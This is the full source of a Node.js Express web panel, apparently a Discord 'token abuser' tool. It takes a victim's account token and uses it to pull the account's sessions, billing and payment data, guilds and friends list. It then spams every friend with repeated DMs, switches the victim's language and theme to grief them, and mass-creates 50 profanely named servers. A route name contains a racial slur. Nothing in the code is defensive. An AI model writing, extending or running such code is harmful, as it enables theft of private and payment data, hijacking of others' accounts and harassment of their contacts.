// ...
const express = require("express");
const path = require("path");
const fs = require("fs");
const os = require("os");
const tcpp = require("tcp-ping");
const { DiscordAPI } = require("./helpers");
const app = express();
const base = "/api/v1";

// ...
let ping;
tcpp.ping({ address: "207.244.235.88", port: "8000" }, (err, data) => {
    ping = `${Math.round(data.avg)}ms`;
});

// ...
const bytesToSize = (bytes) => {
    const sizes = ["Bytes", "KB", "MB", "GB", "TB"];
    if (bytes == 0) return "0 Byte";
    const i = Math.floor(Math.log(bytes) / Math.log(1024));
    const sizeInUnits = (bytes / Math.pow(1024, i)).toFixed(2);
    return `${sizeInUnits} ${sizes[i]}`;
};
const memory = {
    used: `${bytesToSize(process.memoryUsage().heapUsed)}`,
    total: `${bytesToSize(os.totalmem())}`,
};

// ...
if (typeof localStorage === "undefined" || localStorage === null) {
    var LocalStorage = require("node-localstorage").LocalStorage;
    localStorage = new LocalStorage("./scratch");
}

// app stuff idfk
app.use(express.urlencoded({ extended: true }));
app.use(express.json());
app.set("view engine", "ejs");
app.set("views", path.join(__dirname, "views"));

// ...
const checkForToken = (req, res, next) => {
    const token = localStorage.getItem("token");
    if (!token) return res.redirect("/");
    next();
};

// START ROUTES //
app.get("/", async (req, res) => {
    res.render("index");
});
app.get("/user", checkForToken, async (req, res) => {
    const token = localStorage.getItem("token").toString();
    const userData = await DiscordAPI.getUserData(token);
    const userDataJson = await userData.json();

    const userSessions = await DiscordAPI.getUserSessions(token);
    const userSessionsJson = await userSessions.json();

    const userBillingData = await DiscordAPI.getUserBilling(token);
    const userBillingDataJson = await userBillingData.json();

    const userPaymentData = await DiscordAPI.getUserPayments(token);
    const userPaymentDataJson = await userPaymentData.json();

    const guildsData = await DiscordAPI.getUserGuilds(token);
    const guildsDataJson = await guildsData.json();

    const friendsData = await DiscordAPI.getRelationships(token);
    const friendsDataJson = await friendsData.json();

    res.render("user", {
        userDataJson: userDataJson,
        userSessionsJson: userSessionsJson,
        userBillingDataJson: userBillingDataJson,
        userPaymentDataJson: userPaymentDataJson,
        guildsDataJson: guildsDataJson,
        friendsDataJson: friendsDataJson,
        url: `${req.baseUrl + req.path}`,
        memory: memory,
        ping: ping
    });
});
app.get("/spammer", checkForToken, async (req, res) => {
    res.render("spammer", {
        url: `${req.baseUrl + req.path}`,
        memory: memory,
        ping: ping
    });
});
app.get("/misc", checkForToken, async (req, res) => {
    res.render("misc", {
        url: `${req.baseUrl + req.path}`,
        memory: memory,
        ping: ping
    });
});
app.get("/logs", checkForToken, async (req, res) => {
    const logs = await fs.readFileSync("src/logs.txt", (err, data) => {
        if (err) return console.log(err);
        return data;
    });
    
    res.render("logs", {
        logs: logs,
        url: `${req.baseUrl + req.path}`,
        memory: memory,
        ping: ping
    });
});
app.get("/logout", checkForToken, async (req, res) => {
    localStorage.removeItem("token");
    
    res.redirect("/");
});
// END ROUTES //

// START API ROUTES //
app.post(`${base}/saveTokenToLocal`, async (req, res) => {
    const token = req.body.token;
    localStorage.setItem("token", token);

    res.redirect("/user");
});
app.post(`${base}/spamDaNegro`, async (req, res) => {
    const token = localStorage.getItem("token").toString();
    const messageCount = req.body.messageCount;
    const messageContent = req.body.messageContent;

    try {
        const friendsData = await DiscordAPI.getRelationships(token);
        const friends = await friendsData.json();
    
        friends.forEach(async (friend) => {
            const dmData = await DiscordAPI.createDm(token, friend.id);
            const dm = await dmData.json();

            for (let i = 0; i < messageCount; i++) {
                await DiscordAPI.sendMessage(dm.id, token, messageContent);
                fs.appendFile("src/logs.txt", `Sent message to ${friend.user.username} (aka ${friend.user.global_name})\n`, (err) => {
                    if (err) return console.log(err);
                });
            }
        });
    } catch (err) {
        fs.appendFile("src/logs.txt", `${err}\n`, (err) => {
            if (err) return console.log(err);
        });
    }
    
    res.redirect("/spammer");
});
app.get(`${base}/fuckSettings`, async (req, res) => {
    const token = localStorage.getItem("token").toString();

    await DiscordAPI.patchSettings(token, "agYIAhABGgA="); // light mode
    await DiscordAPI.patchSettings(token, "Yg4KBwoFemgtQ04SAwisAg=="); // chinese language

    res.redirect("/misc");
});
app.get(`${base}/createGuild`, async (req, res) => {
    const token = localStorage.getItem("token").toString();
    const guildCount = 50;

    for (let i = 0; i < guildCount; i++) {
        await DiscordAPI.createGuild(token, "Get Fucked By Token Fucker 3000!", "2TffvPucqHkN");
    }

    res.redirect("/misc");
});
app.get(`${base}/clearLogs`, async (req, res) => {
    fs.writeFile("src/logs.txt", "", (err) => {
        if (err) return console.log(err);
    });

    res.redirect("/logs");
});
// END API ROUTES //

// start server
app.listen(8000, () => {
    console.log("Server is now running!")
    console.log("http://localhost:8000");
});